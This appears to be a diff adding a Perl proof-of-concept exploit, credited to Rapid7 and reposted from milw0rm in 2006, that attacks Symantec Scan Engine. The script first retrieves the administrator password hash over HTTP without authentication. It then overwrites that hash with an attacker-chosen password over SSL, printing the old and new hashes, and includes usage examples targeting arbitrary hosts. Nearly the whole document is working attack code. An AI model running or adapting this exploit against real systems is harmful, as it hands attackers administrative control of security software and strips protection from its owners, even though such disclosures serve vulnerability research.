@@ -1,0 +1,243 @@
+#!/usr/bin/perl -w
+#
+# Remotely change the administrator password (or password hash) of
+# Symantec Scan Engine.
+#
+# Author: Marc Bevand of Rapid7 <marc_bevand(at)rapid7.com>
+# Copyright 2006 Rapid7, LLC. All rights reserved.
+#
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions
+# are met:
+#
+#   1. Redistributions of source code must retain the above copyright
+#   notice, this list of conditions and the following disclaimer.
+#
+#   2. Redistributions in binary form must reproduce the above
+#   copyright notice, this list of conditions and the following
+#   disclaimer in the documentation and/or other materials provided
+#   with the distribution.
+#
+#   THIS SOFTWARE IS PROVIDED BY RAPID7, LLC ``AS IS'' AND ANY EXPRESS
+#   OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
+#   WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
+#   ARE DISCLAIMED. IN NO EVENT SHALL RAPID7, LLC BE LIABLE FOR ANY
+#   DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+#   DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
+#   GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
+#   INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
+#   WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
+#   NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
+#   SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+#
+
+use strict;
+use Getopt::Long;
+use LWP::UserAgent;
+use Digest::MD5 qw/md5_hex/;
+use Net::SSLeay::Handle qw/shutdown/;
+
+#
+# Init LWP::UserAgent (the user agent string is the one currently used
+# by the Scan Engine java applet).
+#
+sub init {
+  my $ua;
+  $ua = LWP::UserAgent->new(keep_alive => 0);
+  $ua->agent("Mozilla/4.0 (Windows 2000 5.0) Java/1.4.2_08");
+  return $ua;
+}
+
+#
+# Example of service string to be parsed:
+# 10.68.4.4
+# 10.68.4.4/8004/8005
+# hostname
+# hostname/9004/9005
+#
+sub parse_service {
+  my ($service) = @_;
+
+  if ($service =~ m{^([^/]*)/(\d+)/(\d+)$}) {
+     return $1, $2, $3;
+  } elsif ($service =~ m{^([^/]*)$}) {
+     return $1, 8004, 8005;
+  } else {
+     die "cannot parse service: $service";
+  }
+}
+
+#
+# Sends a request to obtain the password hash. Note: the RSA key
+# (modulus and public exponent) has been randomly chosen.
+#
+sub data_to_send {
+  my $r1 =
+  '<request><key mod="784607708866372110095636553206565253692059085'.
+  '0882661452379500719255245078226751123858547991180612629396444366'.
+  '109364669329014831409765373165312900564995261" pub="754297542068'.
+  '3822223796790522532950961415568940207500046396606172395479254814'.
+  '3383744922039888710333203519260280729415961892539564611703079983'.
+  '74406014351745">I need the key</key></request>'
+  ;
+
+  return $r1;
+}
+
+#
+# Example of response to be parsed:
+# <request>
+#   <message xmlns:xs="http://www.w3.org/2001/XMLSchema"
+#     xmlns:java="class:com.symantec.common.SimpleRSA"
+#     value="01234567890123456789012345678901234567890123456789012345\
+# 6789"/>
+#   <password xmlns:xs="http://www.w3.org/2001/XMLSchema"
+#     xmlns:java="class:com.symantec.common.SimpleRSA"
+#     pass="86B7A1FE120C0279971559B6BAC8C5713EF580BAFD20168D622B7E170\
+# D248642"/>
+# </request>
+#
+sub parse_resp {
+  my ($res) = @_;
+
+  if ($res =~ /pass="([[:xdigit:]]{64})"/) {
+     return $1;
+  } else {
+     die "cannot parse response: $res";
+  }
+}
+
+#
+# Return a password hash.
+#
+sub hash_passwd {
+  my ($pwd) = @_;
+  my $salt = sprintf "%08X%08X%08X%08X", rand(0xffffffff),
+  rand(0xffffffff), rand(0xffffffff), rand(0xffffffff);
+
+  return uc(md5_hex("$pwd$salt")) . $salt;
+}
+
+sub send_request {
+  my ($socket, $req) = @_;
+
+  $req = pack("n", length($req)).$req;
+  print $socket $req;
+}
+
+#
+# Set the administrator password hash.
+#
+sub set_hash {
+  my ($hostname, $port_ssl, $hash) = @_;
+  my $socket;
+  my $reply;
+
+  tie(*SSL, "Net::SSLeay::Handle", $hostname, $port_ssl)
+     or die "ssl tie: $!";
+  $socket = \*SSL;
+  send_request($socket,
+     '<request command="submit" parms="apply" type="saveapply">'.
+     '<![CDATA[<?xml version="1.0" encoding="UTF-8"?>'.
+     '<guichanges><configuration>'.
+     '<changes xpath="//admin/password/@value" value="'.$hash.'"/>'.
+     '</configuration></guichanges>'.
+     ']]></request>');
+  send_request($socket,
+     'UTFWritesDone');
+  shutdown($socket, 1) or die "ssl shutdown: $!";
+  $reply = substr(<$socket>, 2);
+  $reply = substr($reply, 0, index($reply, 'UTFWritesDone') - 2);
+  if ($reply !~ m{<message status='apply_success'>Apply!</message>})
+  {
+     die "command failed: $reply";
+  }
+  close($socket) or die "ssl close: $!";
+}
+
+sub doit {
+  my ($service, $pwd, $hash) = @_;
+  my $hostname;
+  my $port_http;
+  my $port_ssl;
+  my $ua;
+  my $url;
+  my $req;
+  my $res;
+  my $old_hash;
+
+  ($hostname, $port_http, $port_ssl) = parse_service($service);
+  $ua = init();
+  $url = "http://$hostname:$port_http/xml.xml";
+  $req = HTTP::Request->new(POST => $url);
+  $req->content_type('application/x-www-form-urlencoded');
+  $req->content(data_to_send());
+  $res = $ua->request($req);
+  $res->is_success or die "got ".$res->status_line." for $url\n";
+  ($old_hash) = parse_resp($res->content);
+  print "Old hash: $old_hash\n";
+  if ($hash) {
+     set_hash($hostname, $port_ssl, $hash);
+     print "New hash: $hash\n";
+  } else {
+     $hash = hash_passwd($pwd);
+     set_hash($hostname, $port_ssl, $hash);
+     print "New hash: $hash\n";
+     print "Password successfully set to: '$pwd'\n";
+  }
+}
+
+sub error {
+  print STDERR "Try `$0 --help' for more information.\n";
+}
+
+sub usage {
+  print "Usage:\n".
+  "  $0 [OPTIONS] <hostname>\n".
+  "  $0 [OPTIONS] <hostname>/<http_port>/<ssl_port>\n".
+  "Options:\n".
+  "  --help                Display this help\n".
+  "  --pwd <passwd>        Set the password (default: test)\n".
+  "  --hash <passwd_hash>  Set the password hash instead of a parti".
+  "cular password\n".
+  "Examples:\n".
+  "  $0 10.68.4.4\n".
+  "  $0 --pwd foobar 10.68.4.4/8004/8005\n".
+  "";
+}
+
+sub main {
+  my $help;
+  my $pwd = "test";
+  my $hash;
+  my $service;
+
+  if (!GetOptions(
+        "help" => \$help,
+        "pwd=s" => \$pwd,
+        "hash=s" => \$hash,
+     )) {
+     error(); exit(1);
+  }
+  if ($help) {
+     usage(); exit(0);
+  }
+  if (!scalar(@ARGV)) {
+     print STDERR "No service specified.\n";
+     error(); exit(1);
+  } elsif (1 == scalar(@ARGV)) {
+     $service = $ARGV[0];
+  } else {
+     print STDERR "Extra argument: $ARGV[1]\n";
+     error(); exit(1);
+  }
+  doit($service, $pwd, $hash);
+}
+
+main();
+
+#
+# END proof of concept
+#
+
+# milw0rm.com [2006-04-21]
